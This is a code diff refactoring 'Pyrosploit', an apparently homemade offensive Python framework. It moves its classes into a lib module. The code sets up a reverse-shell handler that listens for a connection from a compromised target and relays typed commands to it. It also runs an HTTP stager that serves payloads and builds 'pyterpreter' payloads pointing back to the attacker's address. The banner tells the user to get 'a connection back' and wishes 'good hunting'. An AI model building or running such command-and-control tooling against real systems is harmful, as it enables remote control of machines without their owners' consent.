@@ -2,6 +2,7 @@
 import os
 import socket
 import pyterpreter
+import lib
 from termcolor import colored
 
 
@@ -26,99 +27,8 @@ and at this point you should be trying to get a connection back!
 good hunting!!
 
 ''')
-    for i in commands:
+    for i in lib.commands:
         print(i.name)
-commands = []
-
-class machine:
-    def __init__(self, ip, name):
-        self.ip = ip
-        self.public = False
-        self.name = name
-
-
-class server:
-    def __init__(self, ip, port, protocol):
-        self.ip = ip
-        self.port = port
-        self.protocol = protocol
-    def start(self):
-        if self.protocol == 'http':
-            os.system("python -m http.server {} --bind {} --directory ./stager &".format(self.port, self.ip))
-            self.pid = os.popen('ps | grep python').read()
-            self.pid = self.pid.split('\n')
-            self.pid = self.pid[-2]
-            self.pid = self.pid.split(' ')[2]
-            self.address = 'http://{}:{}'.format(self.ip, self.port)
-            
-        elif self.protocol == 'handler':
-            buffer_size = 10240
-            s = socket.socket()
-            s.bind((self.ip, int(self.port)))
-            s.listen(5)
-            try:
-                print(colored("Listing on {}:{}...".format(self.ip, self.port), 'green'))
-                client_socket, client_address = s.accept()
-                print(colored("Connection established Client - {}:{}".format(client_address[0], client_address[1]), "green"))
-                banner = client_socket.recv(buffer_size).decode()
-                print(banner)
-                while True:
-                    command = input('$>')
-                    client_socket.send(command.encode())
-                    if command.lower() == 'exit':
-                        break
-                    results = client_socket.recv(buffer_size).decode()
-                    print(results)
-                client_socket.close()
-                s.close()
-            except:
-                print("\n")
-                print(colored("hanlder shutdown", "red"))
-                pass
-    def stop(self):
-        if self.protocol == 'http':
-            os.system("kill {}".format(self.pid))
-        else:
-            print("no stop function defined yet!")
-
-
-class payload:
-    def __init__(self, payload, template, parameters):
-        self.name = payload
-        self.template = template
-        self.parameters = parameters
-        self.payload = payload
-    
-    def generate(self):
-        output = self.payload.format(self.parameters)
-        with open("./output/{}".format(self.payload), 'w') as f:
-            f.write(output)
-
-
-class command:
-    def __init__(self, help, name, function, needs):
-        self.help_text = help
-        self.name = name
-        self.function = function
-        self.needs = needs
-        commands.append(self)
-    def get_args(self):
-        if self.needs != False:
-            self.args = []
-            for arg in self.needs:
-                retarg = input("{}? $> ".format(arg))
-                self.args.append(retarg)
-        else:
-            return
-    def help(self):
-        print(self.help_text)
-    
-    def run(self):
-        if self.needs!= False:
-            self.get_args()
-            self.function(self.args)
-        else:
-            self.function()
 
 ############################################# Base Commands ##############################################
 
@@ -132,9 +42,9 @@ it will prompt you for everything you need.
 def handler_set_run():
     port = input("port for handler? $> ")
     global handler_server
-    handler_server = server(attacker.ip, port, 'handler')
+    handler_server = lib.server(attacker.ip, port, 'handler')
 
-handler_setup = command(handler_setup_help, 'handler_setup', handler_set_run, False)
+handler_setup = lib.command(handler_setup_help, 'handler_setup', handler_set_run, False)
 ############################################# handler run ######################################################
 handler_run_help = '''
 This requires a handler_server object be present.
@@ -142,7 +52,7 @@ This requires a handler_server object be present.
 def handler_run_function():
     handler_server.start()
 
-handler_run = command(handler_run_help, 'handler_run', handler_run_function, False)
+handler_run = lib.command(handler_run_help, 'handler_run', handler_run_function, False)
 ##############################################################################################################
 
 ############################################### Stager Commands ##############################################
@@ -155,9 +65,9 @@ This command requires no args, and will prompt for what it needs
 def stager_setup_function():
     port = input("port? $> ")
     global stager
-    stager = server(attacker.ip, port, 'http')
+    stager = lib.server(attacker.ip, port, 'http')
 
-stager_setup = command(stager_setup_help, 'stager_setup', stager_setup_function, False)
+stager_setup = lib.command(stager_setup_help, 'stager_setup', stager_setup_function, False)
 
 ############################################# stager_run ####################################################
 stager_run_help = '''
@@ -166,7 +76,7 @@ This command requires no args.
 '''
 def stager_run_function():
     stager.start()
-stager_run = command(stager_run_help, 'stager_run', stager_run_function, False)
+stager_run = lib.command(stager_run_help, 'stager_run', stager_run_function, False)
 
 ############################################## stager_stop ###################################################
 stager_stop_help = '''
@@ -174,7 +84,7 @@ This command stops the stager, this assumes you've already run stager_setup, and
 '''
 def stager_stop_function():
     stager.stop()
-stager_stop = command(stager_stop_help, 'stager_stop', stager_stop_function, False)
+stager_stop = lib.command(stager_stop_help, 'stager_stop', stager_stop_function, False)
 ###############################################################################################################
 
 ############################################## Pyterpreter commands ##########################################
@@ -189,22 +99,22 @@ def pyterpreter_generate_function():
         format_pyterpreter(attacker, handler_server)
     elif attacker.public == True:
         format_pyterpreter(public_machine, handler_server)
-pyterpreter_generate = command(pyterpreter_generate_help, 'pyterpreter_generate', pyterpreter_generate_function, False)
+pyterpreter_generate = lib.command(pyterpreter_generate_help, 'pyterpreter_generate', pyterpreter_generate_function, False)
 
 def get_attacker_info():
     os.system('ifconfig')
     ip = input("ip of interface to use? $>")
-    attacker = machine(ip, 'attacker')
+    attacker = lib.machine(ip, 'attacker')
     return attacker
 
 def get_target_info():
     ip = input("ip address of the target?")
-    target = machine(ip, 'target')
+    target = lib.machine(ip, 'target')
     return target
 
 def get_server_info(attacker, protocol):
     port = input("port for server? $> ")
-    return server(attacker.ip, port, protocol)
+    return lib.server(attacker.ip, port, protocol)
 
 
 def format_pyterpreter(attacker, listener):
@@ -246,11 +156,6 @@ def format_pytruder(format, server):
             x.write(output)
 
 
-'''def command_line():
-    command = input('$>')
-    if command in'''
-
-
 def main():
     global attacker
     attacker = get_attacker_info()
@@ -265,16 +170,18 @@ def main():
         public_ip = input('public IP address for connecting back? $>')
         attacker.public = True
         global public_machine
-        public_machine = machine(public_ip, 'public')
+        public_machine = lib.machine(public_ip, 'public')
     while True:
         com = input('$> ').split(' ')
         if com[0] == 'help':
             pyrosploit_help()
+        elif len(com[0]) == 0:
+            pass
         elif com[0] == 'exit':
             break
         else:
             success = False
-            for i in commands:
+            for i in lib.commands:
                 if i.name == com[0]:
                     if len(com) == 2:
                         if com[1] == 'help':
@@ -289,19 +196,10 @@ def main():
                 print(colored('error, unknown command', 'red'))
                 
     try:
-        stager.stop()
+        os.system('pkill python')
     except:
         pass
     print(colored("thank you for using Pyrosploit", "green"))
-
-                
-            
-        
-
-
-
-
-
 
 
 if __name__ == '__main__':
